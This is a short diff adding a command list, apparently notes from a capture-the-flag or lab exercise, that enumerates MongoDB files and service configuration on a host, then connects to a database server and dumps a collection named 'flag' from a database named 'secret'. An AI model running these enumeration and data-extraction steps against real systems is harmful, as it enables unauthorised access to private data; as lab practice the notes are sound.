@@ -1,0 +1,12 @@
+cat mongo-init.db
+find / -name "*mongo*" 2>/dev/null
+ls -l /usr/local/bin/config/mongod.service
+ls -l /usr/local/bin/config
+cat /usr/local/bin/startup.sh
+vim /usr/local/bin/config/mongod.service
+
+mongo 192.98.172.3
+show dbs
+use secret
+show collections
+db.flag.find()
